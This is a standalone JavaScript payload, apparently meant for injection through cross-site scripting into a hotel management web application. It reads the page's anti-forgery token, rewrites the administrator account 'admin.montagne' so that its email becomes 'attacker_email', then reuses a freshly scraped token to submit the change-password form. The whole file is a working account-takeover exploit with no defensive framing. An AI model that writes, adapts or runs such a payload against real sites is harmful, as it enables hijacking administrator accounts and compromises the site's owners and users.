var req = new XMLHttpRequest();
req.onload = function handleFirstResponse() {
    var parser = new DOMParser();
    var doc = parser.parseFromString(this.responseText, 'text/html');
    var token = doc.querySelector('input[name="__RequestVerificationToken"]').value;
    console.log(token);

    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/users/details/503/edit', true);
    changeReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    changeReq.send('ViewModel.Id=503&ViewModel.UserName=admin.montagne&ViewModel.CompanyLabel=Hotel+Montagne+SFPMEI&ViewModel.FirstName=admin&ViewModel.LastName=montagne&ViewModel.Email=attacker_email&ViewModel.PhoneNumber=0000000000&ViewModel.Culture=en&ViewModel.NewsletterSubscribed=false&__RequestVerificationToken=' + token);

    // Now trigger the second request
    var req2 = new XMLHttpRequest();
    req2.onload = function handleSecondResponse() {
        var parser = new DOMParser();
        var doc = parser.parseFromString(this.responseText, 'text/html');
        var token = doc.querySelector('input[name="__RequestVerificationToken"]').value;
        console.log(token);

        var changeReq2 = new XMLHttpRequest();
        changeReq2.open('post', '/management/change-password', true);
        changeReq2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        changeReq2.send('__RequestVerificationToken=' + token);
    };
    req2.open('get', '/management/change-password', true);
    req2.send();
};
req.open('get', '/users/details/503/edit', true);
req.send();
